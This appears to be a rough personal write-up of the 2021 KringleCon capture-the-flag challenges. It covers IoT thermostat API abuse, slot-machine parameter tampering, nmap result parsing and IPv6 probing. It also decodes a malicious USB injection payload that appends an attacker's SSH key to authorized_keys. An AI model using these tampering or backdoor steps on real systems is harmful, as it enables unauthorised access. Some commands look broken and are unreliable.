# 2021 Kringlecon writeup

## Objective 2 : Where in the world is caramel santiago?

íȷ

STARING DESIRE FROST

MGRS and 32U NU 05939 98268

They were dressed for 1.0°C and sunny conditions. The elf mentioned something about Stack Overflow and Rust.

Stuttgart has been celebrating Christmas since 1692. Even the rooftops get decorated. And where else does the side of the town hall become a giant Advent calendar? City Hall.

They were checking the Ofcom frequency table to see what amateur frequencies they could use while there.

They said, if asked, they would describe their next location in three words as "frozen, push, and tamed."

They were dressed for 12.0°C and partly cloudy conditions. They kept checking their Twitter app.

I think they left to check out the Défilé de Noël.

They called me and mentioned they were connected via Rogers Wireless.

They were dressed for 1.8°C and clear conditions. Oh, I noticed they had a Doctor Who themed phone case.

Eve Snowshoes

## Objective 3 : Wifi Jackfrost Break in

```bash
wlan0     Scan completed :
          Cell 01 - Address: 02:4A:46:68:69:21
                    Frequency:5.2 GHz (Channel 40)
                    Quality=48/70  Signal level=-62 dBm  
                    Encryption key:off
                    Bit Rates:400 Mb/s
                    ESSID:"FROST-Nidus-Setup"


iwconfig eth0 essid "FROST-Nidus-Setup"
iwconfig wlan0 essid "FROST-Nidus-Setup"

** New network connection to Nidus Thermostat detected! Visit http://nidus-setup:8080/ to complete setup
(The setup is compatible with the 'curl' utility)

elf@f0c65901d224:~$ curl http://nidus-setup:8080/
◈──────────────────────────────────────────────────────────────────────────────◈

Nidus Thermostat Setup

◈──────────────────────────────────────────────────────────────────────────────◈

WARNING Your Nidus Thermostat is not currently configured! Access to this
device is restricted until you register your thermostat » /register. Once you
have completed registration, the device will be fully activated.

In the meantime, Due to North Pole Health and Safety regulations
42 N.P.H.S 2600(h)(0) - frostbite protection, you may adjust the temperature.

API

The API for your Nidus Thermostat is located at http://nidus-setup:8080/apidoc

elf@f0c65901d224:~$ curl http://nidus-setup:8080/register
Welcome to the Nidus Thermostat registration! Simply enter your serial number
below to get started. You can find the serial number on the back of your
Nidus Thermostat as shown below:

elf@b46dccd0a272:~$ curl http://nidus-setup:8080/apidoc
The API endpoints are accessed via:

http://nidus-setup:8080/api/<endpoint>

Utilize a GET request to query information; for example, you can check the
temperatures set on your cooler with:

curl -XGET http://nidus-setup:8080/api/cooler

Utilize a POST request with a JSON payload to configuration information; for
example, you can change the temperature on your cooler using:

curl -XPOST -H 'Content-Type: application/json' \
  --data-binary '{"temperature": 5}' \
  http://nidus-setup:8080/api/cooler


● WARNING: DO NOT SET THE TEMPERATURE ABOVE 0! That might melt important furniture

Available endpoints

┌─────────────────────────────┬────────────────────────────────┐
│ Path                        │ Available without registering? │ 
├─────────────────────────────┼────────────────────────────────┤
│ /api/cooler                 │ Yes                            │ 
├─────────────────────────────┼────────────────────────────────┤
│ /api/hot-ice-tank           │ No                             │ 
├─────────────────────────────┼────────────────────────────────┤
│ /api/snow-shower            │ No                             │ 
├─────────────────────────────┼────────────────────────────────┤
│ /api/melted-ice-maker       │ No                             │ 
├─────────────────────────────┼────────────────────────────────┤
│ /api/frozen-cocoa-dispenser │ No                             │ 
├─────────────────────────────┼────────────────────────────────┤
│ /api/toilet-seat-cooler     │ No                             │ 
├─────────────────────────────┼────────────────────────────────┤
│ /api/server-room-warmer     │ No                             │ 
└─────────────────────────────┴────────────────────────────────
elf@b46dccd0a272:~$ curl -XPOST -H 'Content-Type: application/json' \
  --data-binary '{"temperature": 5}' \
  http://nidus-setup:8080/api/cooler
{
  "temperature": 4.39,
  "humidity": 96.18,
  "wind": 19.63,
  "windchill": 0.35,
  "WARNING": "ICE MELT DETECTED!"
}
```

## Objective 4 : Slot Machine

Use burpsuite.

```bash
In reqeust change the cpl parameter to minus to increase the credit
betamount=1&numline=20&cpl=-10

{
  "success": true,
  "data": {
    "credit": 1181,
    "jackpot": 0,
    "free_spin": 0,
    "free_num": 0,
    "scaler": 0,
    "num_line": 20,
    "bet_amount": 1,
    "pull": {
      "WinAmount": -0,
      "FreeSpin": 0,
      "WildFixedIcons": [],
      "HasJackpot": false,
      "HasScatter": false,
      "WildColumIcon": "",
      "ScatterPrize": 0,
      "SlotIcons": [
        "scatter",
        "icon5",
        "icon8",
        "wild",
        "scatter",
        "icon7",
        "icon6",
        "icon9",
        "icon2",
        "icon9",
        "icon6",
        "wild",
        "icon4",
        "wild",
        "icon3"
      ],
      "ActiveIcons": [],
      "ActiveLines": []
    },
    "response": "I'm going to have some bouncer trolls bounce you right out of this casino!"
  },
  "message": "Spin success"
}
```

## Grab for gold

What port does 34.76.1.22 have open?
Host: 34.76.1.22 ()     Status: Up
Host: 34.76.1.22 ()     Ports: 62078/open/tcp//iphone-sync///      Ignored State: closed (999)

What port does 34.77.207.226 have open?
Host: 34.77.207.226 ()     Status: Up
Host: 34.77.207.226 ()     Ports: 8080/open/tcp//http-proxy///      Ignored State: filtered (999)

How many hosts appear "Up" in the scan?
grep 'Up' bigscan.gnmap | wc -l
26054

- How many hosts have a web port open?  (Let's just use TCP ports 80, 443, and 8080)
grep -E '80/|8080/|443/' bigscan.gnmap | wc -l
14372
Using "-E" tells grep we"re giving it a regular expression (regex).  In this case, that regex says, "I want lines that have 8080/open, 443/open, or 80/open."
If you want to be MORE correct, you might use "(\s8080|\s443|\s80)/open" to ensure you don't snag ports like 50080, but there weren't any in this file.

- How many hosts with status Up have no (detected) open TCP ports?
echo $((`grep Up bigscan.gnmap | wc -l` - `grep Ports bigscan.gnmap | wc -l`))
elf@705a8072467d:~$ grep 'Status: Up' bigscan.gnmap | wc -l
26054
elf@705a8072467d:~$ grep -E 'tcp/' bigscan.gnmap | wc -l
25652
402

Host: 34.76.22.196 ()     Status: Up
Host: 34.76.22.196 ()     Ports: 22/open/tcp//ssh///, 110/open/tcp//pop3///, 443/open/tcp//https///, 5900/open/tcp//vnc///, 8080/open/tcp//http-proxy///      Ignored State: filtered (995)
Host: 34.76.22.197 ()     Status: Up
Host: 34.76.22.197 ()     Ports: 135/open/tcp//msrpc///, 137/open/tcp//netbios-ns///, 139/open/tcp//netbios-ssn///, 445/open/tcp//microsoft-ds///, 3389/open/tcp//ms-wbt-server///      Ignored State: closed (995)

- What's the greatest number of TCP ports any one host has open?
grep -c '/tcp/' bigscan.gnmap | grep -i '^xtcp\{1,3\}'

grep -v ignore bigscan.gnmap | grep -o '/tcp/' | wc -l

## Yara

```bash
yara_rule_135
condition:
      uint16(0) == 0x5a4d and filesize < 700KB and
      8 of them
```

## before obj 5 ipv6 sandbox

<https://gist.github.com/chriselgee/c1c69756e527f649d0a95b6f20337c2f>
List the ipv6 services running on eth0

```ip neigh```

```nmap -6 fe80::42:c0ff:fea8:a002%eth0```
80/tcp and 9000/tcp port open

```curl http://[fe80::42:c0ff:fea8:a002]:80/ --interface eth0```

Gets a response connect to the other TCP port to get the striper's activation phrase!

```curl http://[fe80::42:c0ff:fea8:a002]:9000/ --interface eth0```

Gets a response PieceOnEarth

## Objective 5 strage USB

### Before we start This turns off the mouse within the tmux session (so now wetty can use browser/system mouse to select and copy/paste text), but now you can't select between the top/bottom panes

```tmux set -g mouse off```

### This binds page up to select the top pane; page down to select the bottom pane

```tmux bind-key -T root PageUp select-pane -t 0```
```tmux bind-key -T root PageDown select-pane -t 1```

### To re-enable mouse

```tmux set -g mouse on```

Dump the keyboard injections

```python mallard.py --file=/mnt/USBDEVICE/inject.bin```

```echo "==gCzlXZr9FZlpXay9Ga0VXYvg2cz5yL+BiP+AyJt92YuIXZ39Gd0N3byZ2ajFmau4WdmxGbvJHdAB3bvd2Ytl3ajlGILFESV1mWVN2SChVYTp1VhNlRyQ1UkdFZopkbS1EbHpFSwdlVRJlRVNFdwM2SGVEZnRTaihmVXJ2ZRhVWvJFSJBTOtJ2ZV12YuVlMkd2dTVGb0dUSJ5UMVdGNXl1ZrhkYzZ0ValnQDRmd1cUS6x2RJpHbHFWVClHZOpVVTpnWwQFdSdEVIJlRS9GZyoVcKJTVzwWMkBDcWFGdW1GZvJFSTJHZIdlWKhkU14UbVBSYzJXLoN3cnAyboNWZ" | rev | base64 -d```

Gets a response as below and the troll's name can be found.

```echo 'ssh-rsa UmN5RHJZWHdrSHRodmVtaVp0d1l3U2JqZ2doRFRHTGRtT0ZzSUZNdyBUaGlzIGlzIG5vdCByZWFsbHkgYW4gU1NIIGtleSwgd2UncmUgbm90IHRoYXQgbWVhbi4gdEFKc0tSUFRQVWpHZGlMRnJhdWdST2FSaWZSaXBKcUZmUHAK ickymcgoop@trollfun.jackfrosttower.com' >> ~/.ssh/authorized_keys```
